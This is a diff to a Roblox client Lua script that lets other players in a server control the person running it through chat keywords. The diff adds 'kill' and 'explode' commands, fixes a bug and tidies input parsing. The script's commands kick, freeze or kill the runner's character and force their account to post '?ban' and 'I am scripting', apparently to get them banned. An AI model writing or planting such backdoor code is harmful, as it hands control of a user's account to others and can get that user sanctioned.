@@ -1,4 +1,5 @@
 local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
 local LocalPlayer = Players.LocalPlayer
 if not LocalPlayer then return end
 
@@ -9,6 +10,8 @@ local TOKEN_TO_COMMAND = {
     ["kick"] = "kick",
     ["snitch"] = "snitch",
     ["ban"] = "ban",
+    ["kill"] = "kill",       
+    ["explode"] = "explode", 
 }
 
 local freezeAnchor = nil
@@ -20,7 +23,7 @@ local function applyFreeze()
     local root = char:FindFirstChild("HumanoidRootPart")
     if not root then return end
     local bp = Instance.new("BodyPosition")
-    bp.MaxForce = Vector3.new(1e5,1e5,1e5)
+    bp.MaxForce = Vector3.new(1e5, 1e5, 1e5)
     bp.P = 1e4
     bp.Position = root.Position
     bp.Parent = root
@@ -43,14 +46,11 @@ local function applyKick()
 end
 
 local function applyBan()
-    local TextChatService = game:GetService("TextChatService")
     local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-
     if generalChannel then
-        generalChannel:SendAsync("?ban") -- sends message to chat
+        generalChannel:SendAsync("?ban")
     end
 end
-
 
 local function applyKill()
     local char = LocalPlayer.Character
@@ -64,25 +64,31 @@ end
 local function applyExplode()
     local char = LocalPlayer.Character
     if not char then return end
-    local root = char:FindFirstFirstChild("HumanoidRootPart")
+    local root = char:FindFirstChild("HumanoidRootPart") 
     if not root then return end
+    
     local explosion = Instance.new("Part")
-    explosion.Size = Vector3.new(1,1,1)
+    explosion.Size = Vector3.new(1, 1, 1)
     explosion.CFrame = root.CFrame
     explosion.Anchored = false
     explosion.CanCollide = false
     explosion.Parent = workspace
+    
     local bv = Instance.new("BodyVelocity")
-    bv.MaxForce = Vector3.new(1e4,1e4,1e4)
-    bv.Velocity = Vector3.new(0,50,0)
+    bv.MaxForce = Vector3.new(1e4, 1e4, 1e4)
+    bv.Velocity = Vector3.new(0, 50, 0)
     bv.Parent = explosion
+    
     game:GetService("Debris"):AddItem(explosion, 1)
 end
 
 local function applySnitch()
+    local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if not generalChannel then return end
+    
     for i = 1, 5 do
-        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I am scripting")
-        wait(1)
+        generalChannel:SendAsync("I am scripting")
+        task.wait(1)
     end
 end
 
@@ -100,7 +106,10 @@ local ACTIONS = {
 local function onChatted(speaker, message)
     if not speaker then return end
 
-    local cmd = TOKEN_TO_COMMAND[message]
+    local cleanMessage = string.match(string.lower(message), "^%s*(%w+)")
+    if not cleanMessage then return end
+
+    local cmd = TOKEN_TO_COMMAND[cleanMessage]
     if not cmd then return end
 
     local fn = ACTIONS[cmd]
@@ -109,11 +118,12 @@ local function onChatted(speaker, message)
     end
 end
 
-for _,p in pairs(Players:GetPlayers()) do
+for _, p in pairs(Players:GetPlayers()) do
     if p ~= LocalPlayer then
         p.Chatted:Connect(function(msg) onChatted(p, msg) end)
     end
 end
+
 Players.PlayerAdded:Connect(function(p)
     if p ~= LocalPlayer then
         p.Chatted:Connect(function(msg) onChatted(p, msg) end)
